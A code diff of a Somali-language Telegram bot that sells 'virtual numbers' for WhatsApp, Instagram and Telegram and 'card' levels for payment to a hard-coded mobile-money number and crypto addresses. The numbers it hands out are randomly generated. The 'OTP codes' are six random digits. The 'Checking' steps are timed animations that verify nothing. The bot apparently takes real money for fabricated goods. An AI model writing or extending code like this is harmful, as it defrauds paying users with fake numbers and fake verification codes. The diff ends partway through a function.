@@ -1,6 +1,3 @@
-# =========================
-# PART 1/7 — CORE SETUP
-# =========================
 import os
 import asyncio
 import random
@@ -15,35 +12,18 @@ from aiogram.client.default import DefaultBotProperties
 
 # ================= CONFIG =================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-if not BOT_TOKEN:
-    raise RuntimeError("BOT_TOKEN is not set in environment variables!")
-
 ADMIN_ID = 7983838654
 
 LOCAL_NUMBER = "+252907868526"
 BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
 USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
 
+bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
+dp = Dispatcher(storage=MemoryStorage())
 logging.basicConfig(level=logging.INFO)
 
-# Initialize bot with default properties (parse_mode HTML)
-bot = Bot(
-    token=BOT_TOKEN,
-    default=DefaultBotProperties(parse_mode="HTML")
-)
-
-# Initialize dispatcher with memory storage
-dp = Dispatcher(storage=MemoryStorage())
-
 # ================= DATA STORAGE =================
-users = {}           # Stores user data
-withdrawals = {}     # Stores withdrawal requests
-stats = {
-    "total_users": 0,
-    "total_virtual": 0,
-    "total_card": 0
-}
-withdrawal_counter = 10000  # Auto increment withdrawal ID
+users = {}
 
 # ================= STATES =================
 class VirtualState(StatesGroup):
@@ -52,686 +32,440 @@ class VirtualState(StatesGroup):
 class CardState(StatesGroup):
     screenshot = State()
 
-class WithdrawalState(StatesGroup):
-    waiting_local_number = State()
-    waiting_crypto_address = State()
-
-class AdminAddBalanceState(StatesGroup):
-    waiting_user_id = State()
-    waiting_amount = State()
-
-class WithdrawLocal(StatesGroup):
-    waiting_amount = State()
-
-class WithdrawCrypto(StatesGroup):
-    waiting_address = State()
-    waiting_amount = State()
-
 # ================= HELPERS =================
-def random_number() -> str:
-    return "+25263" + "".join(str(random.randint(0, 9)) for _ in range(7))
+def random_number():
+    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))
 
-def generate_otp() -> str:
+def generate_otp():
     return "".join(random.choices("0123456789", k=6))
 
-def generate_referral() -> str:
-    return "".join(random.choices("0123456789", k=10))
-
-async def live_animation(msg: Message, text: str = "Checking", seconds: int = 5):
+async def live_animation(msg: Message, text="Checking", seconds=5):
     for i in range(seconds):
         dots = "." * (i % 4)
         await asyncio.sleep(1)
         await msg.edit_text(f"{text}{dots}")
 
-# =========================
-# PART 2/7 — START / BALANCE / REFERRAL
-# =========================
-
-# ================= START COMMAND =================
+# ================= START =================
 @dp.message(Command("start"))
 async def start(msg: Message):
-    uid = msg.from_user.id
-
-    # Add new user if not exists
-    if uid not in users:
-        users[uid] = {
-            "balance": 0.0,
-            "referrals": [],
-            "ref_code": generate_referral(),
-            "type": None,
-            "number": None,
-            "platform": None,
-            "card_type": None,
-            "price": 0,
-            "otp": None,
-            "otp_requests": 0,
-            "screenshot": None
-        }
-        stats["total_users"] += 1
-
-    # Main keyboard for users
     kb = ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="Balance"), KeyboardButton(text="Referral")],
-            [KeyboardButton(text="Withdrawal")]
-        ],
+        keyboard=[[KeyboardButton(text="New Order")]],
         resize_keyboard=True
     )
+    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)
 
-    # Admin panel button only for admin
-    if uid == ADMIN_ID:
-        kb.add(KeyboardButton(text="Admin Panel"))
+# ================= NEW ORDER =================
+@dp.message(F.text == "New Order")
+async def new_order(msg: Message):
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual_start")],
+        [InlineKeyboardButton(text="CARD", callback_data="card_start")]
+    ])
+    await msg.answer("Dooro adeeg:", reply_markup=kb)
 
-    await msg.answer(
-        "Ku soo dhawoow Service Bot 🤖\nDooro waxa aad rabto:",
+# ================== VIRTUAL FLOW =================
+@dp.callback_query(F.data == "virtual_start")
+async def virtual_platform(call: CallbackQuery):
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="WHATSAPP", callback_data="v_platform_WHATSAPP")],
+        [InlineKeyboardButton(text="INSTAGRAM", callback_data="v_platform_INSTAGRAM")],
+        [InlineKeyboardButton(text="TELEGRAM", callback_data="v_platform_TELEGRAM")]
+    ])
+    await call.message.edit_text("Dooro Platform:", reply_markup=kb)
+
+@dp.callback_query(F.data.startswith("v_platform_"))
+async def virtual_platform_selected(call: CallbackQuery):
+    platform = call.data.split("_")[2]
+    number = random_number()
+
+    users[call.from_user.id] = {
+        "type": "virtual",
+        "platform": platform,
+        "number": number,
+        "price": "$0.8"
+    }
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="LOCAL", callback_data="v_payment_local")],
+        [InlineKeyboardButton(text="CRYPTO", callback_data="v_payment_crypto")]
+    ])
+
+    await call.message.edit_text(
+        f"Number: {number}\nQiimaha: $0.8\nDooro Payment:",
         reply_markup=kb
     )
 
-# ================= BALANCE MENU =================
-@dp.message(F.text == "Balance")
-async def show_balance(msg: Message):
-    uid = msg.from_user.id
-    user = users.get(uid)
+# ================= VIRTUAL LOCAL PAYMENT =================
+@dp.callback_query(F.data == "v_payment_local")
+async def virtual_local_payment(call: CallbackQuery):
+    uid = call.from_user.id
+    data = users.get(uid)
 
-    if not user:
-        await msg.answer("❌ User lama helin.")
-        return
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="CONFIRM", callback_data=f"v_confirm_payment_{uid}")]
+    ])
 
-    await msg.answer(f"💰 Balance-kaaga hadda: ${user['balance']:.2f}")
-
-# ================= REFERRAL MENU =================
-@dp.message(F.text == "Referral")
-async def show_referral(msg: Message):
-    uid = msg.from_user.id
-    user = users.get(uid)
-
-    if not user:
-        await msg.answer("❌ User lama helin.")
-        return
-
-    ref_list = user.get("referrals", [])
-    text = f"👥 Referral Code: {user['ref_code']}\n"
-    text += f"Number of referrals: {len(ref_list)}\n\n"
-    text += "Referred Users:\n"
-
-    if ref_list:
-        for r in ref_list:
-            text += f"- {r}\n"
-    else:
-        text += "No referrals yet."
-
-    await msg.answer(text)
-
-# =========================
-# PART 3/7 — WITHDRAWAL MENU & ADMIN PANEL
-# =========================
-
-# ================= WITHDRAWAL MENU =================
-@dp.message(F.text == "Withdrawal")
-async def withdrawal_menu(msg: Message):
-    kb = ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="LOCAL"), KeyboardButton(text="CRYPTO")],
-            [KeyboardButton(text="Back")]
-        ],
-        resize_keyboard=True
+    await call.message.edit_text(
+        f"Lacagta ku dir:\n\n{LOCAL_NUMBER}\n"
+        f"Lambarkaaga: {data['number']}\nQiimaha: {data['price']}",
+        reply_markup=kb
     )
-    await msg.answer("💸 Dooro habka lacag bixinta:", reply_markup=kb)
 
-# ================= ADMIN PANEL =================
-@dp.message(F.text == "Admin Panel")
-async def admin_panel(msg: Message):
+# ================= CONFIRM LOCAL =================
+@dp.callback_query(F.data.startswith("v_confirm_payment_"))
+async def confirm_virtual_payment(call: CallbackQuery, state: FSMContext):
+    msg = await call.message.edit_text("Checking...")
+    await live_animation(msg)
+
+    await call.message.answer("Soo dir Screenshot-ka Payment-ka")
+    await state.set_state(VirtualState.waiting_screenshot)
+
+# ================= RECEIVE VIRTUAL SCREENSHOT =================
+@dp.message(StateFilter(VirtualState.waiting_screenshot), F.photo)
+async def receive_virtual_screenshot(msg: Message, state: FSMContext):
     uid = msg.from_user.id
-    if uid != ADMIN_ID:
-        await msg.answer("❌ Kaliya admin ayaa arki kara panel-kan.")
-        return
+    data = users.get(uid)
 
-    kb = ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="Stats")],
-            [KeyboardButton(text="Add Balance")],
-            [KeyboardButton(text="Withdrawal Check")],
-            [KeyboardButton(text="Back")]
-        ],
-        resize_keyboard=True
+    users[uid]["screenshot"] = msg.photo[-1].file_id
+    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")
+
+    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}"),
+            InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}"),
+            InlineKeyboardButton(text="OTP", callback_data=f"admin_otp_{uid}")
+        ]
+    ])
+
+    caption = (
+        f"New Virtual Order\n"
+        f"User: {uid}\n"
+        f"Platform: {data['platform']}\n"
+        f"Number: {data['number']}\n"
+        f"Payment: LOCAL/CRYPTO"
     )
-    await msg.answer("⚙️ Admin Panel:", reply_markup=kb)
 
-# ================= ADMIN STATS =================
-@dp.message(F.text == "Stats")
-async def admin_stats(msg: Message):
-    if msg.from_user.id != ADMIN_ID:
-        return
-
-    total_users = len(users)
-    total_balance = sum(u.get("balance", 0) for u in users.values())
-    total_card_get = sum(1 for u in users.values() if u.get("type") == "card")
-    total_virtual_get = sum(1 for u in users.values() if u.get("type") == "virtual")
-
-    text = (
-        f"📊 Admin Stats\n\n"
-        f"Total Users: {total_users}\n"
-        f"Total Balance: ${total_balance:.2f}\n"
-        f"Total Card Orders: {total_card_get}\n"
-        f"Total Virtual Orders: {total_virtual_get}"
-    )
-    await msg.answer(text)
-
-# ================= ADMIN ADD BALANCE =================
-@dp.message(F.text == "Add Balance")
-async def admin_add_balance(msg: Message, state: FSMContext):
-    if msg.from_user.id != ADMIN_ID:
-        return
-    await msg.answer("📌 Geli Telegram ID-ga user-ka:")
-    await state.set_state(AdminAddBalanceState.waiting_user_id)
-
-@dp.message(StateFilter(AdminAddBalanceState.waiting_user_id))
-async def receive_user_id(msg: Message, state: FSMContext):
-    try:
-        user_id = int(msg.text.strip())
-    except ValueError:
-        await msg.answer("❌ Fadlan geli ID sax ah.")
-        return
-
-    await state.update_data(user_id=user_id)
-    await msg.answer("📌 Geli Amount-ka lagu dari doono Balance:")
-    await state.set_state(AdminAddBalanceState.waiting_amount)
-
-@dp.message(StateFilter(AdminAddBalanceState.waiting_amount))
-async def receive_amount(msg: Message, state: FSMContext):
-    try:
-        amount = float(msg.text.strip())
-    except ValueError:
-        await msg.answer("❌ Fadlan geli Amount sax ah (tusaale: 1.5)")
-        return
-
-    data = await state.get_data()
-    user_id = data.get("user_id")
-
-    # Haddii user cusub yahay, abuuro
-    if user_id not in users:
-        users[user_id] = {
-            "balance": 0.0,
-            "referrals": [],
-            "ref_code": generate_referral(),
-            "type": None,
-            "number": None,
-            "platform": None,
-            "card_type": None,
-            "price": 0,
-            "otp": None,
-            "otp_requests": 0,
-            "screenshot": None
-        }
-
-    users[user_id]["balance"] += amount
-    await msg.answer(f"✅ User {user_id} Balance updated: ${users[user_id]['balance']:.2f}")
+    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb_admin)
     await state.clear()
 
-# ================= ADMIN WITHDRAWAL CHECK =================
-@dp.message(F.text == "Withdrawal Check")
-async def withdrawal_check(msg: Message):
-    if msg.from_user.id != ADMIN_ID:
+# ================= VIRTUAL CRYPTO PAYMENT =================
+@dp.callback_query(F.data == "v_payment_crypto")
+async def virtual_crypto_payment(call: CallbackQuery):
+    uid = call.from_user.id
+    data = users.get(uid)
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="CONFIRM", callback_data=f"v_crypto_confirm_{uid}")]
+    ])
+
+    text = (
+        f"💰 Dir Crypto:\n\n"
+        f"USDT: <code>{USDT_ADDRESS}</code>\n"
+        f"BNB: <code>{BNB_ADDRESS}</code>\n\n"
+        f"Lambarkaaga: {data['number']}\n"
+        f"Qiimaha: {data['price']}"
+    )
+
+    await call.message.edit_text(text, reply_markup=kb)
+
+
+# ================= CONFIRM CRYPTO =================
+@dp.callback_query(F.data.startswith("v_crypto_confirm_"))
+async def confirm_crypto(call: CallbackQuery, state: FSMContext):
+    msg = await call.message.edit_text("Checking Crypto Payment...")
+    await live_animation(msg)
+
+    await call.message.answer("Soo dir Screenshot-ka Crypto Payment-ka")
+    await state.set_state(VirtualState.waiting_screenshot)
+
+
+# ================= ADMIN CONFIRM =================
+@dp.callback_query(F.data.startswith("admin_confirm_"))
+async def admin_confirm(call: CallbackQuery):
+    uid = int(call.data.split("_")[2])
+
+    await bot.send_message(
+        uid,
+        f"✅ Payment Confirmed\n\n"
+        f"Number: {users[uid]['number']}\n"
+        f"Platform: {users[uid]['platform']}\n"
+        f"Status: PAID ✅"
+    )
+
+    await call.message.edit_caption("✅ PAYMENT CONFIRMED")
+
+
+# ================= ADMIN REJECT =================
+@dp.callback_query(F.data.startswith("admin_reject_"))
+async def admin_reject(call: CallbackQuery):
+    uid = int(call.data.split("_")[2])
+
+    await bot.send_message(
+        uid,
+        "❌ Payment lama xaqiijin. Fadlan dib u dir lacagta."
+    )
+
+    await call.message.edit_caption("❌ PAYMENT REJECTED")
+    users.pop(uid, None)
+
+
+# ================= ADMIN SEND OTP =================
+@dp.callback_query(F.data.startswith("admin_otp_"))
+async def admin_send_otp(call: CallbackQuery):
+    uid = int(call.data.split("_")[2])
+
+    otp = generate_otp()
+    users[uid]["otp"] = otp
+    users[uid]["otp_requests"] = 0
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="SHOW OTP", callback_data="show_otp_user")]
+    ])
+
+    await bot.send_message(
+        uid,
+        f"Number: {users[uid]['number']}\n"
+        f"Platform: {users[uid]['platform']}\n"
+        f"PAYMENT: PAID ✅",
+        reply_markup=kb
+    )
+
+    await call.message.edit_caption("OTP sent to user")
+
+
+# ================= USER SHOW OTP =================
+@dp.callback_query(F.data == "show_otp_user")
+async def show_otp(call: CallbackQuery):
+    uid = call.from_user.id
+    otp = users.get(uid, {}).get("otp")
+
+    if not otp:
+        await call.message.edit_text("❌ OTP lama helin.")
         return
 
-    if not withdrawals:
-        await msg.answer("❌ Ma jiraan codsiyo withdraw ah.")
-        return
+    msg = await call.message.edit_text("OTP Loading...")
+    await live_animation(msg, "OTP")
 
-    for req_id, req in withdrawals.items():
-        text = (
-            f"💳 Withdrawal Request\n"
-            f"👤 User: {req['uid']}\n"
-            f"💵 Amount: ${req['amount']:.2f}\n"
-            f"🧾 Request ID: {req_id}\n"
-            f"🏦 {'Number: ' + req['number'] if req['type'] == 'LOCAL' else 'Address: ' + req['address']}\n"
-            f"⏳ Status: {req['status']}"
-        )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
+    ])
+
+    await msg.edit_text(f"OTP Code:\n\n<code>{otp}</code>", reply_markup=kb)
+
+
+# ================= USER CHECK AGAIN =================
+@dp.callback_query(F.data == "check_again_otp")
+async def check_again(call: CallbackQuery):
+    uid = call.from_user.id
+
+    users[uid]["otp_requests"] += 1
+    new_otp = generate_otp()
+    users[uid]["otp"] = new_otp
+
+    msg = await call.message.edit_text("Generating new OTP...")
+    await live_animation(msg, "OTP")
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]
+    ])
+
+    await msg.edit_text(f"NEW OTP:\n\n<code>{new_otp}</code>", reply_markup=kb)
+
+    # haddii 2 jeer la codsado
+    if users[uid]["otp_requests"] == 2:
         kb_admin = InlineKeyboardMarkup(inline_keyboard=[
-            [
-                InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_withdraw_confirm_{req_id}"),
-                InlineKeyboardButton(text="REJECT", callback_data=f"admin_withdraw_reject_{req_id}"),
-                InlineKeyboardButton(text="ASK", callback_data=f"admin_withdraw_ask_{req_id}")
-            ]
+            [InlineKeyboardButton(text="CONFIRM FINAL OTP", callback_data=f"admin_final_confirm_{uid}")]
         ])
-        await msg.answer(text, reply_markup=kb_admin)
 
-# =========================
-# PART 4/7 — LOCAL WITHDRAWAL HANDLING
-# =========================
+        await bot.send_message(
+            ADMIN_ID,
+            f"User {uid} requested OTP 2 times.",
+            reply_markup=kb_admin
+        )
 
-# ================= LOCAL WITHDRAWAL =================
-@dp.message(F.text == "LOCAL")
-async def withdrawal_local(msg: Message, state: FSMContext):
-    uid = msg.from_user.id
-    user = users.get(uid)
 
-    if not user:
-        await msg.answer("❌ User lama helin.")
-        return
+# ================= ADMIN FINAL CONFIRM =================
+@dp.callback_query(F.data.startswith("admin_final_confirm_"))
+async def admin_final_confirm(call: CallbackQuery):
+    uid = int(call.data.split("_")[3])
+    final_otp = users[uid]["otp"]
 
-    await msg.answer("📌 Geli amount-ka aad rabto inaad la baxdo (min $1):")
-    await state.set_state(WithdrawLocal.waiting_amount)
+    await bot.send_message(
+        uid,
+        f"✅ OTP Final Confirmed\n\n<code>{final_otp}</code>\nPayment Verified."
+    )
 
-@dp.message(StateFilter(WithdrawLocal.waiting_amount))
-async def receive_local_withdraw(msg: Message, state: FSMContext):
-    uid = msg.from_user.id
-    user = users.get(uid)
+    await call.message.edit_text(f"✅ User {uid} OTP Final Confirmed")
 
-    if not user:
-        await msg.answer("❌ User lama helin.")
-        return
+# ================= CARD START =================
+@dp.callback_query(F.data == "card_start")
+async def card_start(call: CallbackQuery):
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="LEVEL 1", callback_data="card_level_1")],
+        [InlineKeyboardButton(text="LEVEL 2", callback_data="card_level_2")]
+    ])
+    await call.message.edit_text("Dooro Card Level:", reply_markup=kb)
 
-    # Hubi amount
-    try:
-        amount = float(msg.text.strip())
-    except ValueError:
-        await msg.answer("❌ Fadlan geli amount sax ah (tusaale: 1.0)")
-        return
 
-    if amount < 1:
-        await msg.answer("❌ Minimum amount waa $1")
-        return
+# ================= SELECT CARD LEVEL =================
+@dp.callback_query(F.data.startswith("card_level_"))
+async def card_level_selected(call: CallbackQuery):
+    level = call.data.split("_")[-1]
+    number = random_number()
 
-    balance = user.get("balance", 0)
-    if amount > balance:
-        await msg.answer(f"❌ Balance-gaaga ma filna. Current: ${balance:.2f}")
-        return
-
-    global withdrawal_counter
-    withdrawal_counter += 1
-    req_id = withdrawal_counter
-
-    # Local number user-ka lagu dirayo
-    number = LOCAL_NUMBER
-
-    # Ku dar codsiga withdrawals dict
-    withdrawals[req_id] = {
-        "uid": uid,
-        "amount": amount,
-        "type": "LOCAL",
+    users[call.from_user.id] = {
+        "type": "card",
+        "card_type": f"LEVEL {level}",
         "number": number,
-        "status": "Pending"
+        "price": "$5"
     }
 
-    # Ka jar balance
-    users[uid]["balance"] -= amount
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="LOCAL", callback_data="card_payment_local")],
+        [InlineKeyboardButton(text="CRYPTO", callback_data="card_payment_crypto")]
+    ])
 
-    # Jawaabta user
-    await msg.answer(
-        f"✅ Withdrawal Request Sent\n"
-        f"🧾 Request ID: {req_id}\n"
-        f"💵 Amount: ${amount:.2f}\n"
-        f"🏦 Number: {number}\n"
-        f"💰 Balance Left: ${users[uid]['balance']:.2f}\n"
-        f"⏳ Status: Pending",
-        reply_markup=ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="Back")]],
-            resize_keyboard=True
-        )
+    await call.message.edit_text(
+        f"Card Level: LEVEL {level}\n"
+        f"Number: {number}\n"
+        f"Qiimaha: $5\n\n"
+        f"Dooro Payment:",
+        reply_markup=kb
     )
 
-    # Inline buttons loogu talagalay admin
+
+# ================= CARD LOCAL PAYMENT =================
+@dp.callback_query(F.data == "card_payment_local")
+async def card_payment_local(call: CallbackQuery):
+    uid = call.from_user.id
+    data = users.get(uid)
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="CONFIRM", callback_data=f"card_confirm_payment_{uid}")]
+    ])
+
+    await call.message.edit_text(
+        f"Lacagta ku dir:\n\n{LOCAL_NUMBER}\n\n"
+        f"Number: {data['number']}\n"
+        f"Level: {data['card_type']}\n"
+        f"Qiimaha: {data['price']}",
+        reply_markup=kb
+    )
+
+
+# ================= CARD CRYPTO PAYMENT =================
+@dp.callback_query(F.data == "card_payment_crypto")
+async def card_payment_crypto(call: CallbackQuery):
+    uid = call.from_user.id
+    data = users.get(uid)
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="CONFIRM", callback_data=f"card_confirm_payment_{uid}")]
+    ])
+
+    await call.message.edit_text(
+        f"Dir Crypto:\n\n"
+        f"USDT: <code>{USDT_ADDRESS}</code>\n"
+        f"BNB: <code>{BNB_ADDRESS}</code>\n\n"
+        f"Number: {data['number']}\n"
+        f"Level: {data['card_type']}\n"
+        f"Qiimaha: {data['price']}",
+        reply_markup=kb
+    )
+
+
+# ================= CARD CONFIRM =================
+@dp.callback_query(F.data.startswith("card_confirm_payment_"))
+async def card_confirm(call: CallbackQuery, state: FSMContext):
+    msg = await call.message.edit_text("Checking Payment...")
+    await live_animation(msg)
+
+    await call.message.answer("Soo dir Screenshot-ka Payment-ka")
+    await state.set_state(CardState.screenshot)
+
+
+# ================= RECEIVE CARD SCREENSHOT =================
+@dp.message(StateFilter(CardState.screenshot), F.photo)
+async def receive_card_screenshot(msg: Message, state: FSMContext):
+    uid = msg.from_user.id
+    data = users.get(uid)
+
+    users[uid]["screenshot"] = msg.photo[-1].file_id
+
+    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")
+
     kb_admin = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_withdraw_confirm_{req_id}"),
-            InlineKeyboardButton(text="REJECT", callback_data=f"admin_withdraw_reject_{req_id}"),
-            InlineKeyboardButton(text="ASK", callback_data=f"admin_withdraw_ask_{req_id}")
+            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_card_confirm_{uid}"),
+            InlineKeyboardButton(text="REJECT", callback_data=f"admin_card_reject_{uid}"),
+            InlineKeyboardButton(text="ASK", callback_data=f"admin_card_ask_{uid}")
         ]
     ])
 
-    # Notify admin
-    await bot.send_message(
+    caption = (
+        f"New CARD Order\n\n"
+        f"User: {uid}\n"
+        f"Level: {data['card_type']}\n"
+        f"Number: {data['number']}\n"
+        f"Price: {data['price']}"
+    )
+
+    await bot.send_photo(
         ADMIN_ID,
-        f"💳 NEW LOCAL WITHDRAWAL\n\n"
-        f"👤 User: {uid}\n"
-        f"💵 Amount: ${amount:.2f}\n"
-        f"🧾 Request ID: {req_id}\n"
-        f"🏦 Number: {number}\n"
-        f"⏳ Status: Pending",
+        msg.photo[-1].file_id,
+        caption=caption,
         reply_markup=kb_admin
     )
 
     await state.clear()
 
-    # =========================
-# PART 5/7 — CRYPTO WITHDRAWAL HANDLING
-# =========================
 
-# ================= CRYPTO WITHDRAWAL MENU =================
-@dp.message(F.text == "CRYPTO")
-async def withdrawal_crypto(msg: Message):
-    kb = ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="USDT-BEP20"), KeyboardButton(text="CANCEL")],
-            [KeyboardButton(text="Back")]
-        ],
-        resize_keyboard=True
-    )
-    await msg.answer("💰 Dooro Crypto:", reply_markup=kb)
-
-# ================= RECEIVE CRYPTO ADDRESS =================
-@dp.message(F.text == "USDT-BEP20")
-async def withdrawal_crypto_address(msg: Message, state: FSMContext):
-    await msg.answer("📌 Soo dir Address-kaaga Crypto:")
-    await state.set_state(WithdrawCrypto.waiting_address)
-
-@dp.message(StateFilter(WithdrawCrypto.waiting_address))
-async def receive_crypto_address(msg: Message, state: FSMContext):
-    address = msg.text.strip()
-
-    if len(address) < 10:
-        await msg.answer("❌ Address ma saxna.")
-        return
-
-    await state.update_data(address=address)
-    await msg.answer("📌 Geli Amount-ka lagu bixinayo (min $1):")
-    await state.set_state(WithdrawCrypto.waiting_amount)
-
-# ================= RECEIVE CRYPTO AMOUNT =================
-@dp.message(StateFilter(WithdrawCrypto.waiting_amount))
-async def receive_crypto_amount(msg: Message, state: FSMContext):
-    uid = msg.from_user.id
-    user = users.get(uid)
-
-    if not user:
-        await msg.answer("❌ User lama helin.")
-        return
-
-    data = await state.get_data()
-    address = data.get("address")
-
-    try:
-        amount = float(msg.text.strip())
-    except ValueError:
-        await msg.answer("❌ Fadlan geli amount sax ah (tusaale: 1.0)")
-        return
-
-    if amount < 1:
-        await msg.answer("❌ Minimum amount waa $1")
-        return
-
-    balance = user.get("balance", 0)
-    if amount > balance:
-        await msg.answer(f"❌ Balance-gaaga ma filna. Current: ${balance:.2f}")
-        return
-
-    global withdrawal_counter
-    withdrawal_counter += 1
-    req_id = withdrawal_counter
-
-    # Ku dar codsiga withdrawals dict
-    withdrawals[req_id] = {
-        "uid": uid,
-        "amount": amount,
-        "type": "CRYPTO",
-        "address": address,
-        "status": "Pending"
-    }
-
-    # Ka jar balance
-    users[uid]["balance"] -= amount
-
-    # Jawaabta user
-    await msg.answer(
-        f"✅ Withdrawal Request Sent\n"
-        f"🧾 Request ID: {req_id}\n"
-        f"💵 Amount: ${amount:.2f}\n"
-        f"🏦 Address: {address}\n"
-        f"💰 Balance Left: ${users[uid]['balance']:.2f}\n"
-        f"⏳ Status: Pending",
-        reply_markup=ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="Back")]],
-            resize_keyboard=True
-        )
-    )
-
-    # Inline buttons loogu talagalay admin
-    kb_admin = InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_withdraw_confirm_{req_id}"),
-            InlineKeyboardButton(text="REJECT", callback_data=f"admin_withdraw_reject_{req_id}"),
-            InlineKeyboardButton(text="ASK", callback_data=f"admin_withdraw_ask_{req_id}")
-        ]
-    ])
-
-    # Notify admin
-    await bot.send_message(
-        ADMIN_ID,
-        f"💳 NEW CRYPTO WITHDRAWAL\n\n"
-        f"👤 User: {uid}\n"
-        f"💵 Amount: ${amount:.2f}\n"
-        f"🧾 Request ID: {req_id}\n"
-        f"🏦 Address: {address}\n"
-        f"⏳ Status: Pending",
-        reply_markup=kb_admin
-    )
-
-    await state.clear()
-
-# =========================
-# PART 6/7 — ADMIN CALLBACK HANDLERS
-# =========================
-
-# ================= ADMIN CONFIRM WITHDRAWAL =================
-@dp.callback_query(F.data.startswith("admin_withdraw_confirm_"))
-async def admin_withdraw_confirm(call: CallbackQuery):
-    req_id = int(call.data.split("_")[-1])
-    request = withdrawals.get(req_id)
-
-    if not request:
-        await call.message.edit_text("❌ Request not found.")
-        return
-
-    uid = request["uid"]
-    request["status"] = "Paid"
-
-    # Notify user
-    await bot.send_message(
-        uid,
-        f"✅ Withdrawal Confirmed!\n"
-        f"🧾 Request ID: {req_id}\n"
-        f"💵 Amount: ${request['amount']:.2f}\n"
-        f"⏳ Status: Paid"
-    )
-
-    await call.message.edit_text(f"✅ Withdrawal Request {req_id} Confirmed")
-
-
-# ================= ADMIN REJECT WITHDRAWAL =================
-@dp.callback_query(F.data.startswith("admin_withdraw_reject_"))
-async def admin_withdraw_reject(call: CallbackQuery):
-    req_id = int(call.data.split("_")[-1])
-    request = withdrawals.get(req_id)
-
-    if not request:
-        await call.message.edit_text("❌ Request not found.")
-        return
-
-    uid = request["uid"]
-    request["status"] = "Rejected"
-
-    # Refund balance to user
-    if uid in users:
-        users[uid]["balance"] += request["amount"]
-
-    # Notify user
-    await bot.send_message(
-        uid,
-        f"❌ Withdrawal Rejected!\n"
-        f"🧾 Request ID: {req_id}\n"
-        f"💵 Amount: ${request['amount']:.2f}\n"
-        f"💰 Balance Restored: ${users[uid]['balance']:.2f}\n"
-        f"⏳ Status: Rejected"
-    )
-
-    await call.message.edit_text(f"❌ Withdrawal Request {req_id} Rejected")
-
-
-# ================= ADMIN ASK USER =================
-@dp.callback_query(F.data.startswith("admin_withdraw_ask_"))
-async def admin_withdraw_ask(call: CallbackQuery):
-    req_id = int(call.data.split("_")[-1])
-    request = withdrawals.get(req_id)
-
-    if not request:
-        await call.message.edit_text("❌ Request not found.")
-        return
-
-    uid = request["uid"]
+# ================= ADMIN CONFIRM CARD =================
+@dp.callback_query(F.data.startswith("admin_card_confirm_"))
+async def admin_card_confirm(call: CallbackQuery):
+    uid = int(call.data.split("_")[-1])
+    data = users.get(uid)
 
     await bot.send_message(
         uid,
-        "ℹ️ Admin ayaa kula soo xiriiri doona si dalabkaaga loo dhamaystiro."
+        f"✅ Payment Confirmed!\n\n"
+        f"Number: {data['number']}\n"
+        f"Level: {data['card_type']}\n"
+        f"Status: PAID ✅"
     )
 
-    await call.message.edit_text(f"⚠️ Admin Requested User for Withdrawal {req_id}")
+    await call.message.edit_caption("✅ CARD PAYMENT CONFIRMED")
 
 
-# ================= REFERRAL SYSTEM =================
-def add_referral(user_id: int, ref_code: str):
-    """Add referral user if ref_code exists"""
-    for uid, data in users.items():
-        if data.get("ref_code") == ref_code:
-            if user_id not in data["referrals"]:
-                data["referrals"].append(user_id)
-                # Optional bonus for referral
-                data["balance"] += 0.5
-            break
+# ================= ADMIN REJECT CARD =================
+@dp.callback_query(F.data.startswith("admin_card_reject_"))
+async def admin_card_reject(call: CallbackQuery):
+    uid = int(call.data.split("_")[-1])
 
-
-@dp.message(lambda m: m.text and m.text.startswith("/ref "))
-async def referral_handler(msg: Message):
-    parts = msg.text.split()
-    if len(parts) != 2:
-        await msg.answer("❌ Usage: /ref <referral_code>")
-        return
-
-    ref_code = parts[1].strip()
-    uid = msg.from_user.id
-
-    add_referral(uid, ref_code)
-    await msg.answer(f"✅ Referral code applied: {ref_code}")
-
-# =========================
-# PART 7/7 — INLINE NAVIGATION & MAIN ENTRY POINT
-# =========================
-
-# ================= INLINE USER NAVIGATION =================
-@dp.callback_query(F.data == "check_balance")
-async def inline_check_balance(call: CallbackQuery):
